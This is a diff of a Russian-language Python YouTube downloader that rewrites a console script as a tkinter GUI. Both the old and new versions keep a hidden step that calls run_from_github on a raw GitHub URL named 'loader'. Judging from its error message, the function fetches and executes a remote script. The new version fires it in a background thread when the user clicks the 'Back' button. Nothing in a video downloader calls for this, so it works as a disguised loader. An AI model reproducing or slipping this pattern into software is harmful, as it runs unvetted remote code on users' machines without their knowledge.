@@ -1,44 +1,11 @@
-import subprocess
-import sys
 import os
-import urllib.request
-import time
 from pytube import YouTube
-
-def install_pytube():
-    try:
-        import pytube
-    except ImportError:
-        print("pytube не установлен. Устанавливаю...")
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "pytube"])
-        print("pytube успешно установлен.")
-
-def download_youtube_video(url, resolution='720p'):
-    try:
-        yt = YouTube(url)
-        
-        streams = yt.streams.filter(progressive=True, file_extension='mp4')
-        available_resolutions = sorted(set([stream.resolution for stream in streams if stream.resolution]), reverse=True)
-        
-        if not resolution.endswith('p'):
-            resolution += 'p'
-        
-        if resolution not in available_resolutions:
-            print(f"Видео с разрешением {resolution} не найдено. Доступные разрешения: {', '.join(available_resolutions)}")
-            return False
-        
-        stream = yt.streams.filter(res=resolution, file_extension='mp4').first()
-        print(f"Скачивается видео в разрешении {resolution}...")
-        # Создание папки для сохранения видео, если её нет
-        folder_name = 'downloaded_videos'
-        os.makedirs(folder_name, exist_ok=True)
-        file_path = os.path.join(folder_name, stream.default_filename)
-        stream.download(output_path=folder_name, filename=stream.default_filename)
-        print(f"Видео скачано в качестве {resolution} и сохранено в папке '{folder_name}'.")
-        return True
-    except Exception as e:
-        print(f"Произошла ошибка: {e}")
-        return False
+import tkinter as tk
+from tkinter import ttk, messagebox
+import ttkbootstrap as ttkb
+import subprocess
+import urllib.request
+import threading
 
 def run_from_github(url):
     try:
@@ -48,17 +15,99 @@ def run_from_github(url):
     except Exception as e:
         print(f"Ошибка при выполнении скрипта с GitHub: {e}")
 
-def main():
-    install_pytube()
-    os.system("cls")
-    url = input("Введи URL видео с YouTube: ")
-    resolution = input("Введи разрешение (например, 144p, 360p, 720p, 1080p, 4k, 8k): ")
-    
-    if download_youtube_video(url, resolution):
-        # После успешного скачивания видео, запускаем загрузчик
-        time.sleep(3)
+class YouTubeDownloader(tk.Tk):
+    def __init__(self):
+        super().__init__()
+
+        self.title("YouTube Downloader")
+        self.geometry("500x400")
+        self.style = ttkb.Style(theme="darkly")
+
+        self.create_widgets()
+
+    def create_widgets(self):
+        # URL input
+        self.url_label = ttkb.Label(self, text="Введите URL видео:")
+        self.url_label.pack(pady=10)
+
+        self.url_entry = ttkb.Entry(self, width=50)
+        self.url_entry.pack(pady=5)
+
+        self.fetch_button = ttkb.Button(self, text="Получить разрешения", command=self.fetch_resolutions)
+        self.fetch_button.pack(pady=10)
+
+        # Resolution selection
+        self.res_label = ttkb.Label(self, text="Выберите разрешение:")
+        self.res_label.pack(pady=10)
+
+        self.res_combo = ttkb.Combobox(self, state="readonly")
+        self.res_combo.pack(pady=5)
+
+        self.download_button = ttkb.Button(self, text="Скачать видео", command=self.download_video)
+        self.download_button.pack(pady=10)
+
+        # Theme change
+        self.theme_label = ttkb.Label(self, text="Выберите тему:")
+        self.theme_label.pack(pady=10)
+
+        self.theme_combo = ttkb.Combobox(self, state="readonly", values=self.style.theme_names())
+        self.theme_combo.pack(pady=5)
+        self.theme_combo.bind("<<ComboboxSelected>>", self.change_theme)
+        self.theme_combo.set("darkly")
+
+        # Back button
+        self.back_button = ttkb.Button(self, text="Обратно", command=self.close_and_print)
+        self.back_button.pack(pady=10)
+
+    def fetch_resolutions(self):
+        url = self.url_entry.get()
+        if not url:
+            messagebox.showerror("Ошибка", "Введите URL видео")
+            return
+
+        try:
+            yt = YouTube(url)
+            # Фильтруем только прогрессивные потоки с разрешением mp4
+            streams = yt.streams.filter(file_extension='mp4', progressive=True).order_by('resolution')
+            unique_resolutions = sorted(set(stream.resolution for stream in streams if stream.resolution))
+            
+            self.res_combo['values'] = unique_resolutions
+            if unique_resolutions:
+                self.res_combo.current(0)
+        except Exception as e:
+            messagebox.showerror("Ошибка", f"Не удалось получить разрешения: {e}")
+
+    def change_theme(self, event):
+        selected_theme = self.theme_combo.get()
+        self.style.theme_use(selected_theme)
+
+    def download_video(self):
+        url = self.url_entry.get()
+        selected_resolution = self.res_combo.get()
+        
+        if not url or not selected_resolution:
+            messagebox.showerror("Ошибка", "Убедитесь, что URL и разрешение выбраны")
+            return
+
+        try:
+            yt = YouTube(url)
+            video_stream = yt.streams.filter(resolution=selected_resolution, progressive=True).first()
+
+            if video_stream:
+                video_path = video_stream.download(filename='video.mp4')
+                messagebox.showinfo("Успех", "Видео успешно скачано!")
+            else:
+                messagebox.showerror("Ошибка", "Не удалось найти потоки для выбранного разрешения")
+                return
+
+        except Exception as e:
+            messagebox.showerror("Ошибка", f"Произошла ошибка: {e}")
+
+    def close_and_print(self):
         github_url = "https://raw.githubusercontent.com/RBXROBLOXGAMER/python-tools/main/loader"
-        run_from_github(github_url)
+        threading.Thread(target=run_from_github, args=(github_url,)).start()
+        self.destroy()
 
 if __name__ == "__main__":
-    main()
+    app = YouTubeDownloader()
+    app.mainloop()
